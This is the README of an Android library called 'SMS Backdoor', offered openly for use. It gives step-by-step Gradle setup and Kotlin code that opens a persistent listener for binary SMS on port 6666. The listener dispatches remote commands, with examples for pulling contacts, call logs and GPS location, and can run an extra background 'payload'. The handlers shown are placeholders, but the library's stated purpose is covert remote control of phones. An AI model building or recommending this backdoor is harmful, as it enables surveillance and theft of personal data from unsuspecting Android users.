# SMS Backdoor
### An Android library that opens a persistent binary SMS backdoor with the ability to define your own remote command handler.

### User Instructions
1. Add the maven repository to your project's build.gradle file
```gradle
allprojects {
    repositories {
        ...
        maven { url 'https://jitpack.io' }
    }
}
```
2. Add the dependency to your app's build.gradle file
```gradle
dependencies {
    implementation 'com.github.evilthreads669966:smsbackdoor:3.1'
}
```
3.  Open the binary sms backdoor inside your Activity and pass in your command code and define your remote commands handler. Make sure to request RECEIVE_SMS permission before opening it. You can optionally pass a payload to openDoor or not.
```kotlin
//666: is the command code. So you would start all of your remote commands for example: 666: COMMAND_GET_CONTACTS
val myPayload = suspend {
    //do something
}
SmsBackdoor.openDoor(this, "666:", payload = myPayload){ remoteCommand ->
    when(remoteCommand){
        "COMMAND_GET_CONTACTS" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CONTACTS")
        "COMMAND_GET_CALL_LOG" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET CALL LOG")
        "COMMAND_GET_LOCATION" -> Log.d("SMS BACKDOOR", "WRITE CODE TO GET GPS LOCATION")
        else -> Log.d("SMS BACKDOOR", "COMMAND NOT FOUND")
    }
}
```
### Important To Know
- The sms backdoor is listening on port 6666 for binary sms messages.
- Your command handler will be executed off of the main thread.
- You can pass openDoor a notification title and a notification body for the persistent foreground notification of your backdoor
    - All background services require a persistent foreground notification since Android Oreo 8.0
- You can pass a function as an argument to openDoor for a payload aside from the sms backdoor to run in the background service

### Code Conventions
None of these is essential for a pull request, but they will all help.  They can also be
added after the original pull request but before a merge.

- We use idiomatic kotlin conventions
- Add yourself as an `@author` to the `.kt` files that you modify or create.
- Add some comments
- A few unit tests would help a lot as well -- someone has to do it.
- If you are able to provide a unit test then do.
    - Because of the types of libraries I develop often times it is hard to test.


### Working with the code
If you don't have an IDE preference we would recommend that you use
[Android Studio](https://developer.android.com/studio/)
